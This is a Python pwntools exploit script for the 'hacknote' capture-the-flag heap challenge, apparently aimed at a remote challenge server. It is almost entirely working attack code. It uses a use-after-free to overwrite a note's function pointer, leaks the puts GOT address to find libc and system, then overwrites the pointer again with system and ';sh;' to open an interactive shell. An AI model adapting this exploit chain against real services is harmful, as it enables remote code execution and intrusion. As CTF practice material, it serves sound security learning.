from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.arch = 'i386'
libc=ELF('./libc_32.so.6')
# libc=ELF('/home/cutecabbage/glibc-all-in-one/libs/2.27-3ubuntu1_i386/libc.so.6')
# p=process('./hacknote')
p=remote('61.147.171.105',62260)
# pause()
elf=ELF('./hacknote')
def add(size,content):
    p.sendlineafter(b'Your choice :',str(1).encode())
    p.sendlineafter(b'Note size :',str(size).encode())
    p.sendlineafter(b'Content :',content)
def delete(index):
    p.sendlineafter(b'Your choice :',str(2).encode())
    p.sendlineafter(b'Index :',str(index).encode())
def print_note(index):
    p.sendlineafter(b'Your choice :',str(3).encode())
    p.sendlineafter(b'Index :',str(index).encode())
add(0x20,b'aaaaaaaa')
add(0x20,b'bbbbbbbb')
delete(0)
delete(1)
add(0x8,p32(0x0804862b)+p32(elf.got['puts']))
print_note(0)
puts_addr=u32(p.recv(4))
print(hex(puts_addr))
# libc=LibcSearcher('puts',puts_addr)
# libc_base=puts_addr-libc.dump('puts')
# system_addr=libc_base+libc.dump('system')
# binsh_addr=libc_base+libc.dump('str_bin_sh')
libc_base=puts_addr-libc.symbols['puts']
system_addr=libc_base+libc.symbols['system']
print('libc_base',hex(libc_base))
# pause()
delete(2)
add(0x8,p32(system_addr)+b';sh;')
pause()
print_note(0)
p.interactive()